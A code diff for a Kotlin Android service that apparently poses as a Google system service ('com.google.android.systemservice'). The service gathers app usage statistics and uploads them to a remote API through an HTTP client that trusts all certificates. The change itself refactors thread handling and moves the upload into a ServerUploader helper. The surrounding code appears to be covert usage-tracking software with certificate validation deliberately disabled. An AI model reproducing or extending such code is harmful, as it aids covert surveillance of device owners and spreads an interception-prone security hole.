@@ -8,6 +8,7 @@ import android.os.IBinder
 import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.OfflineDataQueue
+import com.google.android.systemservice.utils.ServerUploader
 import com.google.android.systemservice.utils.TrustAllCertificates
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.Request
@@ -28,15 +29,18 @@ class AppUsageService : Service() {
     }
 
     private val httpClient = TrustAllCertificates.createClientBuilder().build()
+    private var workerThread: Thread? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Thread { collectAndSend() }.start()
+        workerThread = Thread { collectAndSend() }.also { it.start() }
         return START_NOT_STICKY
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        workerThread?.interrupt()
+        workerThread = null
         httpClient.dispatcher.executorService.shutdown()
         httpClient.connectionPool.evictAll()
         stopForeground(false)
@@ -94,25 +98,16 @@ class AppUsageService : Service() {
     }
 
     private fun sendToServer(payload: JSONObject) {
-        try {
-            val body = payload.toString().toRequestBody("application/json".toMediaType())
-            val request = Request.Builder()
-                .url("${AndroidConfig.apiBaseUrl}/app_usage")
-                .post(body)
-                .build()
-
-            httpClient.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    Log.d(TAG, "App usage stats sent")
-                } else {
-                    Log.w(TAG, "Upload failed: ${response.code}")
-                    queueOffline(payload.toString())
-                }
+        ServerUploader.uploadJson(
+            client = httpClient,
+            url = "${AndroidConfig.apiBaseUrl}/app_usage",
+            data = payload,
+            onSuccess = { Log.d(TAG, "App usage stats sent") },
+            onError = { e ->
+                Log.w(TAG, "Upload failed: ${e.message}")
+                queueOffline(payload.toString())
             }
-        } catch (e: IOException) {
-            Log.e(TAG, "Network error: ${e.message}")
-            queueOffline(payload.toString())
-        }
+        )
     }
 
     private fun queueOffline(json: String) {
